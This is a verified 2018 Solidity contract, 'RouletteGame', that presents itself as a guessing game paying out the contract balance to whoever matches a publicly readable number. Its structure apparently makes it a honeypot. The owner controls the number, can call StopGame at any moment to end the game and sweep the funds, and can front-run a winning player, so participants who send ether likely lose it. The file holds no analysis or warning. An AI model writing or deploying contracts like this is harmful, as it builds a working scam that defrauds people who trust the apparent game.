
//Address: 0xb6f6f6f47e92e517876d30c04198f45a3bc1b281
//Contract name: RouletteGame
//Balance: 0 Ether
//Verification Date: 6/18/2018
//Transacion Count: 2

// CODE STARTS HERE

pragma solidity ^0.4.20;

contract RouletteGame
{

    uint8 public result = 0;
    
    bool public finished = false;
    
    address public rouletteOwner;

    function Play(uint8 _bet)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(result == _bet && msg.value>0.001 ether && !finished)
        {
            msg.sender.transfer(this.balance);
            GiftHasBeenSent();
        }
    }

    function StartRoulette(uint8 _number)
    public
    payable
    {
        if(result==0)
        {
            result = _number;
            rouletteOwner = msg.sender;
        }
    }

    function StopGame()
    public
    payable
    {
        require(msg.sender == rouletteOwner);
        GiftHasBeenSent();
        if (msg.value>0.001 ether){
            msg.sender.transfer(this.balance);
        }
    }

    function GiftHasBeenSent()
    private
    {
        finished = true;
    }

    function() public payable{}
}
